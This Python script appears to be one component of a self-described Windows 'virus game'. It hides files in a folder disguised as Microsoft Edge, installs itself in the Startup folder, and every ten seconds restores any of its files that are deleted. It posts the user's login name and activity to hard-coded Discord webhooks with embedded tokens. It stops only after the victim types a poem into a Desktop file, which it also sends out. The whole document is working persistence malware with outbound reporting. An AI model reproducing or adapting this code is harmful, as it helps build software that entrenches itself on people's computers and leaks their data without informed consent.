import os, subprocess, sys, time
import requests
import tkinter

home_dir = os.path.expanduser("~")
appdata = os.environ['APPDATA']
shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
virus_dir = os.path.join(
    home_dir,
    ".temp",
    "Microsoft_Edge_x64",
    "utils"
)

files_to_backup = [
    __file__,
    os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3"),
    os.path.join(shell_startup_dir, "python_executable_update_service.py"),
    os.path.join(virus_dir, "cleanup_x64.py"),
]

def log_to_discord(msg:str, important=False):
    data = {"username":f"User:{os.getlogin()}", "content":msg}
    try:
        requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
        if important:
            requests.post("https://discord.com/api/webhooks/1434566903019606127/-a0uOC4OWuJx7qpPWbIAF7PdYSGHQKQqlFdu8lcvNBSq2N9KHUr-qjJgCjy9gl0w1BfT", json = data)
    except:
        print("Failed to send port request")
log_to_discord("File checker...")

def check_resign():  
    try:
        with open(os.path.join(home_dir, "Desktop", "vzdavam_sa.txt")) as f:
            content = f.readlines()
            if len(content) > 3:
                log_to_discord("Basnicka:\n```" + "\n".join(content) + "```", important=True)
                try:
                    import send2trash

                    for file_path in files_to_backup:
                        if os.path.exists(file_path):
                            send2trash.send2trash(file_path)
                            log_to_discord(f"Moved {file_path} to recycle bin.")
                    root = tkinter.Tk()
                    root.withdraw()
                    tkinter.messagebox.showinfo("Success", "All virus files were moved into bin.\nRestart your computer to stop all remaining virus processes.")
                except ImportError:
                    # if tkinter.messagebox.askquestion("Warning: package missing", f"Warning: package send2trash is missing. Do you want to delete all virus files permanently? Make sure you don't accidentally delete your files.\nFile list:{'\n'.join([i[1] for i in files_to_backup])}\n\nContinue deleting?"):
                    os.makedirs(os.path.join(home_dir, "Desktop", "trash"))
                    trash_dir = os.path.join(home_dir, "Desktop", "trash")
                    for file_path in files_to_backup:
                        if os.path.exists(file_path):
                            os.rename(file_path, os.path.join(trash_dir, os.path.basename(file_path)))
                            log_to_discord(f"Moved {file_path} moved to Desktop/trash.")
                    root = tkinter.Tk()
                    root.withdraw()
                    tkinter.messagebox.showinfo("Success", "All virus files were moved to <user>/Desktop/trash/. You can review the code and safely delete it.\nRestart your computer to stop all remaining virus processes.")
                tkinter.messagebox.showinfo("Thanks for playing", "Thanks for playing 'virus game'.\nYou can review source code on https://github.com/Hacaric/virus_game\nHave a nice day.\n\t-programmers from Gama")
                sys.exit()
            else:
                raise Exception()
    except:
        pass

backuped_files = [open(path, "rb").read() for path in files_to_backup]

while True:
    check_resign()
    for index, path in enumerate(files_to_backup):
        backup = backuped_files[index]
        try:
            if not os.path.exists(path) or open(path, "rb").read() != backup:
                log_to_discord(f"File {path} was removed, reconstructing", important=True)
                with open(path, "wb") as file:
                    file.write(backup)
        except Exception as e:
            log_to_discord(f"Error: {e}")
    time.sleep(10)


